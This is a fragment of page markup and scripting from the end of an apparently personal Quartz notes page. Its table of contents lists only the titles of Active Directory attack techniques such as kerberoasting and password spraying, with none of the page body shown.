                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div id="global-graph-outer"><div id="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true}"></div></div></div><div class="toc desktop-only"><button type="button" id="toc" class aria-controls="toc-content" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="toc-content" class><ul class="overflow"><li class="depth-0"><a href="#harvest-kerberos-tickets" data-for="harvest-kerberos-tickets">Harvest Kerberos tickets</a></li><li class="depth-0"><a href="#password-spraying" data-for="password-spraying">Password spraying</a></li><li class="depth-0"><a href="#kerberoasting" data-for="kerberoasting">Kerberoasting</a></li><li class="depth-0"><a href="#as-rep-roasting" data-for="as-rep-roasting">AS-REP roasting</a></li><li class="depth-0"><a href="#use-a-certificate-to-request-a-ticket" data-for="use-a-certificate-to-request-a-ticket">Use a certificate to request a ticket</a></li><li class="depth-0"><a href="#change-a-users-password" data-for="change-a-users-password">Change a user’s password</a></li></ul></div></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.4.0</a> © 2025</p><ul><li><a href="/">Home</a></li><li><a href="https://github.com/necopinus/resume/raw/main/resume.pdf">Resume</a></li><li><a href="/#contact">Contact</a></li><li><a href="/grimoire/index.xml">RSS Feed</a></li></ul></footer></div></div></body><script type="application/javascript">function c(){let t=this.parentElement;t.classList.toggle("is-collapsed");let l=t.classList.contains("is-collapsed")?this.scrollHeight:t.scrollHeight;t.style.maxHeight=l+"px";let o=t,e=t.parentElement;for(;e;){if(!e.classList.contains("callout"))return;let n=e.classList.contains("is-collapsed")?e.scrollHeight:e.scrollHeight+o.scrollHeight;e.style.maxHeight=n+"px",o=e,e=e.parentElement}}function i(){let t=document.getElementsByClassName("callout is-collapsible");for(let s of t){let l=s.firstElementChild;if(l){l.addEventListener("click",c),window.addCleanup(()=>l.removeEventListener("click",c));let e=s.classList.contains("is-collapsed")?l.scrollHeight:s.scrollHeight;s.style.maxHeight=e+"px"}}}document.addEventListener("nav",i);window.addEventListener("resize",i);
</script><script src="../postscript.js" type="module"></script></html>